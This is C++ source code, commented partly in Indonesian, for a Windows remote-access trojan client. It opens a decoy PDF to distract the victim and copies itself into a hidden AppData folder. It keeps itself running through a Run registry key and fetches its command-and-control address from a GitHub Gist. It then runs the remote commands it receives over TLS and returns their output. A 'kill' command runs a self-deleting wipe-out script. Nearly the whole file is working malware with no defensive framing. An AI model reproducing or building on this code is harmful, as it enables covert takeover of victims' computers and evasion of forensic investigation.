#include <iostream>
#include <string>
#include <openssl/ssl.h>
#include <openssl/err.h>
#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shellapi.h>
#include <shlobj.h>
#endif

#include <fstream>
#include <chrono>
#include <ctime>
#include <thread>
#include "ssl_client.h"
#include "executor.h"
#include "../common/protocol.h"
#include "../common/utils.h"
#include "../common/config.h"

// Helper to convert wstring to string for logging
std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// Helper to convert string to wstring
std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring strTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &strTo[0], size_needed);
    return strTo;
}

// Fungsi untuk mendapatkan path stealth di AppData (Versi Unicode)
std::wstring GetStealthPathW() {
#ifdef _WIN32
    wchar_t appDataPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        // Gunakan konstanta dari config yang sudah ter-enkripsi
        std::wstring subdir = StringToWString(PERSISTENCE_SUBDIR);
        std::wstring exe = StringToWString(PERSISTENCE_EXE);
        std::wstring stealthDir = std::wstring(appDataPath) + L"\\" + subdir;
        return stealthDir + L"\\" + exe;
    }
#endif
    return L"";
}

// Function to clone self to a hidden directory and return true if currently running from the stealth path
bool MigrateToHiddenPath() {
#ifdef _WIN32
    wchar_t currentPath[MAX_PATH];
    if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
        LogToFile("client.log", "[-] GetModuleFileNameW failed.");
        return false;
    }

    std::wstring stealthPath = GetStealthPathW();
    if (stealthPath.empty()) {
        LogToFile("client.log", "[-] GetStealthPathW returned empty.");
        return false;
    }

    // Check if we are already running from the stealth path (Case-insensitive)
    if (_wcsicmp(currentPath, stealthPath.c_str()) == 0) {
        return true; 
    }

    LogToFile("client.log", "[*] Initializing Unicode-safe migration...");

    // Identify the stealth directory
    std::wstring stealthDir = stealthPath.substr(0, stealthPath.find_last_of(L"\\/"));

    // Ensure the hidden directory exists
    if (CreateDirectoryRecursiveW(stealthDir)) {
        SetFileHiddenW(stealthDir);
        // Copy self to the hidden folder
        if (CopyFileW(currentPath, stealthPath.c_str(), FALSE)) {
            SetFileHiddenW(stealthPath);
            LogToFile("client.log", "[+] Migration Successful. Launching clone.");

            // Execute the cloned version and exit the current bait version
            if ((INT_PTR)ShellExecuteW(NULL, L"open", stealthPath.c_str(), NULL, NULL, SW_HIDE) > 32) {
                exit(0); 
            } else {
                LogToFile("client.log", "[-] ShellExecuteW failed to launch clone.");
            }
        } else {
            LogToFile("client.log", "[-] CopyFileW failed (Error: " + std::to_string(GetLastError()) + ")");
        }
    } else {
        LogToFile("client.log", "[-] CreateDirectoryRecursiveW failed.");
    }
#endif
    return false;
}

// Fungsi untuk menambahkan executable ke Windows Registry agar Auto-Run
void MaintainPersistence() {
#ifdef _WIN32
    if (!AUTO_PERSISTENCE) return;

    std::wstring exePath = GetStealthPathW();
    if (exePath.empty()) return;

    HKEY hKey;
    std::wstring runKeyPath = StringToWString(PERSISTENCE_REG_KEY);
    std::wstring regName = StringToWString(PERSISTENCE_REG_NAME);
    
    // Cek apakah key sudah ada dan sesuai
    wchar_t currentVal[MAX_PATH];
    DWORD valSize = sizeof(currentVal);
    bool needsUpdate = true;

    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExW(hKey, regName.c_str(), NULL, NULL, (BYTE*)currentVal, &valSize) == ERROR_SUCCESS) {
            if (_wcsicmp(currentVal, exePath.c_str()) == 0) {
                needsUpdate = false;
            }
        }
        RegCloseKey(hKey);
    }

    if (needsUpdate) {
        if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, regName.c_str(), 0, REG_SZ, (const BYTE*)exePath.c_str(), (exePath.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
        }
    }
#endif
}

// Fungsi untuk menghapus jejak persistence dan uninstall diri sendiri
void RemovePersistence() {
#ifdef _WIN32
    HKEY hKey;
    std::wstring runKeyPath = StringToWString(PERSISTENCE_REG_KEY);
    std::wstring regName = StringToWString(PERSISTENCE_REG_NAME);

    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath.c_str(), 0, KEY_SET_VALUE | KEY_WOW64_32KEY | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, regName.c_str());
        RegCloseKey(hKey);
    }
    // Coba juga tanpa flag WOW64
    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, regName.c_str());
        RegCloseKey(hKey);
    }
#endif
}

// Function to perform a total scorched-earth self-destruct
void ExecuteSelfDestruct() {
#ifdef _WIN32
    LogToFile("client.log", "[!] COMMENCING TOTAL WIPE-OUT...");
    RemovePersistence();
    
    std::wstring stealthPath = GetStealthPathW();
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring suicideBatch = std::wstring(tempPath) + L"wipeout.bat";

    std::string batchPathNarrow = WStringToString(suicideBatch);
    std::ofstream batchF(batchPathNarrow);
    if (batchF.is_open()) {
        batchF << "@echo off\n";
        batchF << "timeout /t 2 /nobreak > NUL\n"; // Wait for process to end
        
        // Delete logs
        batchF << "if exist \"" << LOG_DIR << "\" rmdir /s /q \"" << LOG_DIR << "\"\n";
        
        if (!stealthPath.empty()) {
            std::string stealthPathNarrow = WStringToString(stealthPath);
            std::string stealthDirNarrow = WStringToString(stealthPath.substr(0, stealthPath.find_last_of(L"\\/")));
            
            // Force delete file (even if hidden/system/readonly)
            batchF << "del /f /q /a \"" << stealthPathNarrow << "\"\n";
            // Delete folder if empty
            batchF << "rmdir /q \"" << stealthDirNarrow << "\"\n";
        }
        
        batchF << "del /f /q \"%0\"\n"; // Self-delete batch
        batchF.close();

        // Launch wipeout script completely hidden
        ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c \"" + suicideBatch + L"\"").c_str(), NULL, SW_HIDE);
    }
    TerminateProcess(GetCurrentProcess(), 0);
#else
    exit(0);
#endif
}

// Function to detach from console when double-clicked (fix cursor loading)
void DetachFromConsole() {
#ifdef _WIN32
    FreeConsole();
#endif
}

// Fungsi untuk mengambil alamat C2 dinamis dari GitHub Gist
#ifdef _WIN32
bool FetchC2AddressFromGist(const std::string& url, std::string& host, int& c2_port) {
    HINTERNET hInternet = InternetOpenA(AGENT_UA.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    // Append dynamic Cache Buster (Timestamp) to bypass GitHub CDN and WinInet cache
    std::string cacheBustedUrl = url;
    if (cacheBustedUrl.find('?') == std::string::npos) {
        cacheBustedUrl += "?nonce=" + std::to_string(time(NULL));
    } else {
        cacheBustedUrl += "&nonce=" + std::to_string(time(NULL));
    }

    // Gunakan flag NO_CACHE agar Windows tidak mengambil data lama dari memory
    HINTERNET hUrl = InternetOpenUrlA(hInternet, cacheBustedUrl.c_str(), NULL, 0, 
                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        LogToFile("client.log", "[-] InternetOpenUrlA failed for GIST_RAW_URL (Url: " + cacheBustedUrl + ")");
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[1024];
    DWORD bytesRead;
    std::string response;

    while (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    size_t colonPos = response.find(':');
    if (colonPos != std::string::npos) {
        host = response.substr(0, colonPos);
        try {
            std::string portStr = response.substr(colonPos + 1);
            size_t endpos = portStr.find_last_not_of(" \n\r\t");
            if (std::string::npos != endpos) portStr = portStr.substr(0, endpos + 1);
            c2_port = std::stoi(portStr);
            return true;
        } catch (...) {
            return false;
        }
    }
    return false;
}
// Function to extract and open the embedded PDF bait file
void ExtractAndOpenPDF() {
    // 1. Locate the PDF resource within our own executable
    HRSRC hRes = FindResourceA(NULL, "IDR_PDF_DATA", RT_RCDATA);
    if (!hRes) return;

    // 2. Load and lock the resource to get the raw binary bytes
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    DWORD dwSize = SizeofResource(NULL, hRes);
    void* pData = LockResource(hData);
    if (!pData) return;

    // 3. Construct the temporary disk path for extraction
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) > 0) {
        strcat(tempPath, "datapeserta.pdf");

        // 4. Write bytes to the temporary file
        std::ofstream outFile(tempPath, std::ios::binary);
        if (outFile.is_open()) {
            outFile.write((const char*)pData, dwSize);
            outFile.close();

            // 5. Open the file with the default PDF viewer
            ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);
        }
    }
}
#endif

// Fungsi Utama Agen berjalan di Background Thread
void AgentRuntime() {
    // 1. SINGLE INSTANCE CHECK (Mutex)
    // Memastikan hanya satu agent yang berjalan untuk mencegah konflik.
#ifdef _WIN32
    HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        exit(0); // Already running, exit silently
    }
#endif
    
    // DETACH FROM CONSOLE TO FIX CURSOR LOADING ON DOUBLE-CLICK
    // Check if running from Windows Explorer (parent process is explorer.exe)
#ifdef _WIN32
    DWORD parentPID = GetCurrentProcessId();
    DWORD ppid = 0;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (pe32.th32ProcessID == parentPID) {
                    ppid = pe32.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // Lepas dari console jika parent adalah explorer.exe atau aplikasi GUI lainnya
    if (ppid > 0) {
        HANDLE hParentProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ppid);
        if (hParentProc != INVALID_HANDLE_VALUE) {
            char parentName[MAX_PATH] = {};
            if (GetProcessImageFileNameA(hParentProc, parentName, MAX_PATH) > 0) {
                std::string parent_str = parentName;
                if (parent_str.find(EXPLORER_NAME) != std::string::npos) {
                    DetachFromConsole();
                }
            }
            CloseHandle(hParentProc);
        }
    }
#endif
    
    // ONLY CREATE LOG FILES IF LOGGING IS ENABLED
    if (LOGGING_ENABLED) {
        EnsureDirectoryExists(LOG_DIR);
        LogToFile("client.log", "[*] OMEGA Agent started (Subsystem: WIN32)");
    }

    // HIDDEN MODE: No Console needed for -mwindows / WIN32 subsystem apps

    // 2. AUTO-RUN (Persistence)
    MaintainPersistence();

    // 3. INITIALIZATION
    int port = SERVER_PORT;

    InitializeSockets();

    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    // 4. DYNAMIC C2 RESOLUTION & RECONNECTION LOOP
    int failed_attempts = 0;
    const int MAX_FAILED_ATTEMPTS = 3;
    
    int current_sleep_seconds = 10; // Start with 10s sleep
    const int MAX_SLEEP_SECONDS = 300; // Max 5 minutes
    
    while (true) {
        // 4.1 Check Internet Presence (Lightweight)
#ifdef _WIN32
        // Use a fast DNS check or well-known site to ensure net is up
        if (!InternetCheckConnectionA("https://www.bing.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
            if (LOGGING_ENABLED) LogToFile("client.log", "[-] No internet connection detected. Sleeping " + std::to_string(current_sleep_seconds) + "s.");
            Sleep(current_sleep_seconds * 1000);
            
            // Exponential Backoff
            if (current_sleep_seconds < MAX_SLEEP_SECONDS) current_sleep_seconds *= 2;
            if (current_sleep_seconds > MAX_SLEEP_SECONDS) current_sleep_seconds = MAX_SLEEP_SECONDS;
            continue;
        }
#endif

        std::string host = "localhost";
        int dynamic_port = port;
        
#ifdef _WIN32
        // Force re-fetch from GitHub after 3 failed connection attempts
        if (failed_attempts >= MAX_FAILED_ATTEMPTS) {
            LogToFile("client.log", "[!] Failed " + std::to_string(failed_attempts) + " times. Re-fetching from GitHub for updates...");
            failed_attempts = 0; // Reset counter
        }
        
        // Fetch URL from Github Gist
        if (!FetchC2AddressFromGist(GIST_RAW_URL, host, dynamic_port)) {
            LogToFile("client.log", "[-] Failed to fetch C2 address from Gist cloud. Retrying in " + std::to_string(current_sleep_seconds) + "s.");
            Sleep(current_sleep_seconds * 1000);
            
            // Exponential Backoff
            if (current_sleep_seconds < MAX_SLEEP_SECONDS) current_sleep_seconds *= 2;
            if (current_sleep_seconds > MAX_SLEEP_SECONDS) current_sleep_seconds = MAX_SLEEP_SECONDS;
            continue;
        }

        LogToFile("client.log", "[*] Resolved C2 Address: " + host + ":" + std::to_string(dynamic_port));
#endif

        SSLClient client(host, dynamic_port);
        
        if (!client.Connect()) {
            failed_attempts++;
            LogToFile("client.log", "[-] Connection failed (" + std::to_string(failed_attempts) + "/" + std::to_string(MAX_FAILED_ATTEMPTS) + ") to " + host + ":" + std::to_string(dynamic_port) + ". Sleeping " + std::to_string(current_sleep_seconds) + "s.");
            
            Sleep(current_sleep_seconds * 1000);
            
            // Exponential Backoff
            if (current_sleep_seconds < MAX_SLEEP_SECONDS) current_sleep_seconds *= 2;
            if (current_sleep_seconds > MAX_SLEEP_SECONDS) current_sleep_seconds = MAX_SLEEP_SECONDS;
            continue; 
        }

        LogToFile("client.log", "[+] Secure connection established with Nexus Controller.");

        SSL* ssl = client.GetSSL();

        // Reset failed attempts & sleep interval on successful connection
        failed_attempts = 0;
        current_sleep_seconds = 10; // Reset backoff

        // Authentication Phase
        if (!SendSecureMessage(ssl, AUTH_TOKEN)) {
            client.Disconnect();
            
#ifdef _WIN32
            Sleep(5000);
#else
            sleep(5);
#endif
            continue;
        }

        // Execution Loop
        std::string command;
        while (true) {
            if (!ReceiveSecureMessage(ssl, command)) {
                // Server disconnected. Break to reconnect.
                break;
            }

            // Kill Switch interception
            if (command == ":kill") {
                LogToFile("client.log", "[!] CRITICAL: RECEIVED KILL SIGNAL - COMMENCING WIPE-OUT...");
                
                // Confirm to server
                SendSecureMessage(ssl, "Agent has successfully wiped registry footprint and is terminating indefinitely.\n");
                SendSecureMessage(ssl, "TERMINATED"); // Final status flag

                // Wait small interval (500ms) to ensure packet delivery
#ifdef _WIN32
                Sleep(500);
#else
                sleep(1);
#endif

                ExecuteSelfDestruct();
            }

            // Sleep Switch interception
            if (command.substr(0, 7) == ":sleep ") {
                try {
                    int seconds = std::stoi(command.substr(7));
                    std::string msg = "Agent acknowledged sleep for " + std::to_string(seconds) + " seconds. Going Dark...";
                    SendSecureMessage(ssl, msg);
                    SendSecureMessage(ssl, "SLEEPING");
                    client.Disconnect();
#ifdef _WIN32
                    Sleep(seconds * 1000);
#else
                    sleep(seconds);
#endif
                    break; // Break the execution loop to reconnect after sleep
                } catch (...) {
                    SendSecureMessage(ssl, "[-] Invalid sleep duration.\n");
                    SendSecureMessage(ssl, Executor::GetCurrentDir());
                    continue;
                }
            }

            // Execute safely via Invisible Pipes
            std::string output = Executor::ExecuteCommand(command);

            // Get Current Working Directory internally
            std::string cwd = Executor::GetCurrentDir();

            // Periodic persistence reenforcement
            MaintainPersistence();

            // Send Output
            if (!SendSecureMessage(ssl, output)) {
                // Connection lost while sending. Break to reconnect.
                break;
            }

            // Send CWD state
            if (!SendSecureMessage(ssl, cwd)) {
                break;
            }
        }

        // If we reach here, the session dropped. Disconnect and loop back to retry.
        client.Disconnect();
#ifdef _WIN32
        Sleep(5000);
#else
        sleep(5);
#endif
    }

    // Unreachable in this daemon
    CleanupSockets();
    EVP_cleanup();
}

int main() {
    // 0. EXTRACTION & BAIT LAUNCH
    // This part opens the PDF instantly to satisfy the user's curiosity
    // while the agent initializes in the background.
#ifdef _WIN32
    // 1. AUTO-MIGRATE TO HIDDEN PATH (Persistence Cloning)
    // If we are the 'Bait' version, we launch the PDF, spawn the clone, and exit.
    // If we are already the 'Clone', we continue to the C2 logic.
    if (MigrateToHiddenPath()) {
        // We are the persistent clone. Monitor our own survival.
        MaintainPersistence();
    } else {
        // We are the bait. Open the PDF first.
        ExtractAndOpenPDF();
    }
#endif

    // Spawn the C2 logic in a detached background thread
    std::thread agent_thread(AgentRuntime);
    agent_thread.detach();

    // MAIN THREAD: Pump Windows messages.
    // This instantly satisfies Explorer's 'WaitForInputIdle' state, resolving the 
    // spinning 'loading' cursor problem when double-clicking the raw executable.
#ifdef _WIN32
    MSG msg;
    // Force creation of a message queue
    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);
    // Sit in an idle message loop indefinitely so the process stays alive
    // The process will naturally terminate when the AgentRuntime thread calls exit(0)
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
#else
    // For Linux/macOS, simply wait forever since there's no loading cursor issue
    while (true) {
        std::this_thread::sleep_for(std::chrono::hours(24));
    }
#endif

    return 0;
}
